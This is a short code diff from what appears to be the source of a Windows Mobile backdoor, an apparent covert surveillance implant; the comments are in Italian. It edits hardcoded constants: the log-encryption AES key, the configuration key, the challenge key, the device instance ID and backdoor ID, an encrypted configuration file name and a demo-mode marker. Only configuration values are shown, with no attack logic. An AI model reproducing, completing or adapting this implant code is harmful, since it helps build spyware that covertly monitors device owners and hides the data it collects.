@@ -16,7 +16,7 @@ wstring g_StrDemo;
 */
 
 // Subversion
-BYTE g_Subtype[16] = "WINMOBILE\x00\x00\x00\x00\x00\x00";
+BYTE g_Subtype[16] = "WINMO\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
 
 // Chiave per cifrare i log
 BYTE g_AesKey[] = "3j9WmmDgBqyU270FTid3719g64bP4s52";
@@ -27,14 +27,14 @@ BYTE g_ConfKey[] = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
 // 20 byte che identificano univocamente il dispositivo su cui runna la backdoor
 BYTE g_InstanceId[] = "bg5etG87q20Kg52W5Fg1";
 
-// 16 byte che identificano univocamente la backdoor (NULL terminato)
-BYTE g_BackdoorID[] = "av3pVck1gb4eR2d8";
+// 14 byte che identificano univocamente la backdoor
+BYTE g_BackdoorID[] = "av3pVck1gb4eR2\x00\x00";
 
 // Chiave per il challenge
 BYTE g_Challenge[] = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
 
 // Nome del file di configurazione CIFRATO con il primo byte di g_Challenge[]
-WCHAR g_ConfName[] = L"c3mdX053du1YJ541vqWILrc4Ff71pViL";
+WCHAR g_ConfName[] = L"cptm511.dql";
 
 // Marker per il demo mode
 BYTE g_Demo[] = "hxVtdxJ/Z8LvK3ULSnKRUmLE";
